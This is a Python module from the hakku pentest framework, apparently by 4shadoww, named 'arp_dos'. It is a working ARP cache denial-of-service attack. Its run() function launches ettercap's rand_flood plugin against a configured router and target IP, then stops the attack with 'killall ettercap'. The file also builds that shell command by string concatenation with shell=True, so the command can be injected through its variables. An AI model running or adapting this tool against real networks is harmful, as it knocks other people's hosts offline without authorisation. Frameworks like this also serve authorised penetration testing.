#        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)
from core.hakkuframework import *
from core import colors
import subprocess
from time import sleep
import os

conf = {
    "name": "arp_dos",
    "version": "1.0",
    "shortdesc": "arp cache denial of service attack",
    "github": "4shadoww",
    "author": "4shadoww",
    "email": "4shadoww0@gmail.com",
    "initdate": "3.3.2016",
    "lastmod": "31.12.2016",
    "needroot": 1,
    "apisupport": False,
    "dependencies": ["xterm", "ettercap"]

}


# List of the variables
variables = OrderedDict((
    ('target', ['192.168.1.2', 'target ip address']),
    ('router', ['192.168.1.1', 'router ip address']),
    ('interface', ['eth0', 'network interface name']),
))


# Additional help notes
help_notes = colors.red+"this module will not work without root permissions!"+colors.end

# Simple changelog
changelog = "Version 1.0:\nrelease"

def run():
    printInfo("attack has been started...")
    command = 'xterm -e ettercap -i '+ variables['interface'][0] + ' -Tq -P rand_flood ' + '/'+variables['router'][0]+'//' + ' ' + '/'+variables['target'][0]+'//'
    subprocess.Popen(command, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
    line_4 = colors.blue+"for stop attack press [enter]"+colors.end
    fin = input(line_4)
    os.system('killall ettercap')
    printInfo("attack stoped")